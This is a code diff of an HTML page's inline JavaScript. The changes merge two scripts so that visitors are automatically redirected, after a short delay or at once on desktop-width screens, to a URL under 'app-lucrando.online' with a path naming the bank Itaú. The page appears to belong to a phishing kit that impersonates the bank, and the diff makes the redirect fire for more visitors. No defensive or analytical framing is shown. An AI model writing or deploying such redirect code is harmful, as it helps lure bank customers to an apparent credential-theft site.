@@ -54,39 +54,32 @@
     </div>
 
     <script>
-        function redirectTime() {
-            setTimeout(() => {
-                window.location = "https://seguro.app-lucrando.online/itau/home/";
-            }, 1000);
-        }
+  function redirectTime() {
+    setTimeout(() => {
+      window.location = "https://seguro.app-lucrando.online/itau/home/";
+    }, 1000);
+  }
 
-        function showMessage() {
-            const message = document.querySelector('.message');
-            message.style.display = 'block';
-            redirectTime();
-        }
+  function showMessage() {
+    const message = document.querySelector('.message');
+    message.style.display = 'block';
+    redirectTime();
+  }
 
-        window.onload = () => {
-            setTimeout(showMessage, 2000);
-        };
-        
-    </script>
-    <script>
   function isDesktop() {
     return window.innerWidth > 768;
   }
 
-  function isMousePresent() {
-    return navigator.userAgent.toLowerCase().indexOf('mouse') !== -1;
-  }
-
   function redirectIfDesktop() {
-    if (isDesktop() && isMousePresent()) {
+    if (isDesktop()) {
       window.location = 'https://seguro.app-lucrando.online/itau/home/';
     }
   }
 
-  window.onload = redirectIfDesktop;
+  window.onload = () => {
+    setTimeout(showMessage, 2000);
+    redirectIfDesktop();
+  };
 </script>
 </body>
 </html>
